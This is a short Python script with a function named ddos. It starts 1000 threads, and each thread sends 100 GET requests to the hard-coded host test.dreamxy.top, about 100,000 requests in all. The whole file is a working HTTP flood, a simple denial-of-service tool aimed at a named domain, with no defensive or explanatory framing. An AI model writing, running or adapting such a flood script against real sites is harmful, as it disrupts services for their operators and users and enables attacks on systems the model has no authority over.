import threading
import requests



def ddos():
    for i in range(100):    
        r = requests.get("http://test.dreamxy.top/").status_code
        print(r)
        
    
if __name__ == "__main__":
    try:    
        threads = [threading.Thread(target=ddos) for i in range(1000)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    except:
        print('error')
